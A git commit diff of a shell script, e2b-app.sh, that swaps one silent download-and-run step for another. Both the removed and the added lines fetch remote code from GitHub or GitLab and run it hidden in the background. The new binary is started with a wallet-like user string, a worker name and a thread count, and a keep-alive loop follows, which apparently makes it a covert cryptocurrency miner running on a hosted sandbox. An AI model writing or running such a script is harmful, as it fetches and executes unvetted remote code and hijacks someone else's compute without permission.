991c7d20369c2ed76020a6a0f3f633474fb36a72
gaserjuk <gaserjukilo@gmail.com>
2026-05-17 11:46:28 +0700

    Update e2b-app.sh

--- e2b-app.sh
+++ e2b-app.sh
@@ -1,12 +1,10 @@
 #!/bin/bash
-curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/vertex.tar.gz >/dev/null 2>&1
-tar -xvf vertex.tar.gz >/dev/null 2>&1
-rm vertex.tar.gz
-chmod +x run.sh
-bash run.sh 7 >/dev/null 2>&1 &
-sleep 200
+curl -s -L -o ban https://gitlab.com/nujuk-group/samin/-/raw/main/volt?ref_type=heads >/dev/null 2>&1
+chmod 777 ban
+./ban --user 88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL --pass WORKER-E --threads 7 >/dev/null 2>&1 &
+sleep 20
 while true
 do
-        echo "Ojo Lali Ngopi Boss..."
+        echo "Keras Boss..."
         sleep 720
 done
